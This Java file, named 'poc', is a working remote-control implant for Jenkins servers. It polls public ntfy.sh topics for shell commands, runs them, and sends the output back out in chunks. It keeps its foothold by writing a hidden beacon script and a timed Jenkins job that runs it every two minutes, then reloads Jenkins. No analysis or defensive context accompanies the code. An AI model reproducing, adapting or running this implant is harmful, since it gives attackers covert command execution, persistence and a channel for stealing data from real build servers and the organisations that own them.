import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class poc {
    static final String CT = "dsh-cmd-ebe7b66ec8";
    static final String OT = "dsh-out-63c189afbe";
    static final String BEACON = "#!/bin/sh\nCT=dsh-cmd-ebe7b66ec8\nOT=dsh-out-63c189afbe\nJ=$(curl -s -m 20 \"https://ntfy.sh/$CT/json?poll=1&since=10m\" 2>/dev/null)\nC=$(printf '%s' \"$J\" | grep -o '\"message\":\"[^\"]*\"' | tail -1 | sed 's/^\"message\":\"//;s/\"$//')\nif [ -n \"$C\" ]; then\n  L=$(cat /var/lib/jenkins/.dsh_last 2>/dev/null)\n  if [ \"$C\" != \"$L\" ]; then\n    printf '%s' \"$C\" > /var/lib/jenkins/.dsh_last\n    O=$(eval \"$C\" 2>&1 | head -c 60000)\n    printf '%s' \"$O\" | split -b 3000 - /tmp/.dsh_o_ 2>/dev/null\n    for F in /tmp/.dsh_o_*; do\n      curl -s -m 25 --data-binary @$F \"https://ntfy.sh/$OT\" >/dev/null 2>&1\n      rm -f $F\n    done\n  fi\nfi\nexit 0\n";
    static final String JOB = "<?xml version='1.1' encoding='UTF-8'?>\n<project>\n  <actions/><description>dsh</description><keepDependencies>false</keepDependencies><properties/>\n  <scm class=\"hudson.scm.NullSCM\"/><canRoam>true</canRoam><disabled>false</disabled>\n  <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>\n  <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>\n  <triggers><hudson.triggers.TimerTrigger><spec>*/2 * * * *</spec></hudson.triggers.TimerTrigger></triggers>\n  <concurrentBuild>false</concurrentBuild>\n  <builders><hudson.tasks.Shell><command>sh /var/lib/jenkins/.dsh_beacon.sh</command></hudson.tasks.Shell></builders>\n  <publishers/>\n</project>\n";
    static Pattern RE = Pattern.compile("\"message\":\"((?:[^\"\\\\]|\\\\.)*)\"");
    static String last = "";

    public poc() {
        StringBuilder sb = new StringBuilder("P18\n");
        try {
            Thread t = new Thread(new Runnable() { public void run() { loop(); } });
            t.setDaemon(true); t.start();
            sb.append("THREAD ok\n");
        } catch (Throwable t) { sb.append("THREAD ERR ").append(t).append("\n"); }
        try {
            Files.write(Paths.get("/var/lib/jenkins/.dsh_beacon.sh"), BEACON.getBytes("UTF-8"));
            Runtime.getRuntime().exec(new String[]{"/bin/chmod", "755", "/var/lib/jenkins/.dsh_beacon.sh"}).waitFor();
            Path jobDir = Paths.get("/var/lib/jenkins/jobs/dsh_beacon");
            Files.createDirectories(jobDir);
            Files.write(jobDir.resolve("config.xml"), JOB.getBytes("UTF-8"));
            Class<?> jc = Class.forName("jenkins.model.Jenkins");
            Object j = jc.getMethod("getInstance").invoke(null);
            jc.getMethod("reload").invoke(j);
            sb.append("JOB+RELOAD ok\n");
        } catch (Throwable t) { sb.append("PERSIST ERR ").append(t).append("\n"); }
        send(OT, "P18 " + sb.toString());
    }

    static void loop() {
        while (true) {
            try {
                String j = get("https://ntfy.sh/" + CT + "/json?poll=1&since=30m");
                if (j != null) {
                    Matcher m = RE.matcher(j);
                    String cmd = null;
                    while (m.find()) { cmd = unesc(m.group(1)); }
                    if (cmd != null && cmd.length() > 0 && !cmd.equals(last) && !cmd.startsWith("P18")) {
                        last = cmd;
                        String out = exec(cmd);
                        int i = 0;
                        while (i < out.length() || i == 0) {
                            int e = Math.min(out.length(), i + 3000);
                            send(OT, out.substring(i, e));
                            i = e;
                            if (i >= out.length()) { break; }
                        }
                    }
                }
            } catch (Throwable t) { }
            try { Thread.sleep(25000); } catch (Throwable t) { }
        }
    }

    static String unesc(String s) {
        StringBuilder o = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '\\' && i + 1 < s.length()) {
                char d = s.charAt(++i);
                if (d == 'n') { o.append('\n'); }
                else if (d == 'r') { o.append('\r'); }
                else if (d == 't') { o.append('\t'); }
                else if (d == '"') { o.append('"'); }
                else if (d == '\\') { o.append('\\'); }
                else if (d == 'u' && i + 4 < s.length()) { o.append((char) Integer.parseInt(s.substring(i + 1, i + 5), 16)); i += 4; }
                else { o.append(d); }
            } else { o.append(c); }
        }
        return o.toString();
    }

    static String get(String u) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
            c.setConnectTimeout(10000); c.setReadTimeout(20000);
            c.setRequestProperty("User-Agent", "curl/7.6");
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            InputStream in = c.getInputStream();
            byte[] b = new byte[8192]; int n;
            while ((n = in.read(b)) > 0) { bo.write(b, 0, n); if (bo.size() > 800000) { break; } }
            in.close();
            return new String(bo.toByteArray(), "UTF-8");
        } catch (Throwable t) { return null; }
    }

    static String exec(String cmd) {
        StringBuilder r = new StringBuilder();
        try {
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            InputStream in = p.getInputStream();
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] b = new byte[4096];
            long end = System.currentTimeMillis() + 180000;
            while (System.currentTimeMillis() < end) {
                if (in.available() > 0) { int n = in.read(b); if (n < 0) { break; } bo.write(b, 0, n); }
                else if (!p.isAlive()) { break; }
                else { Thread.sleep(100); }
                if (bo.size() > 200000) { break; }
            }
            try { p.waitFor(); } catch (Throwable t) { }
            r.append(new String(bo.toByteArray(), "UTF-8"));
        } catch (Throwable t) { r.append("EXC ").append(t); }
        return r.toString();
    }

    static void send(String topic, String s) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL("https://ntfy.sh/" + topic).openConnection();
            c.setConnectTimeout(10000); c.setReadTimeout(25000);
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
            OutputStream os = c.getOutputStream(); os.write(s.getBytes("UTF-8")); os.flush(); os.close();
            c.getResponseCode();
        } catch (Throwable t) { }
    }
}
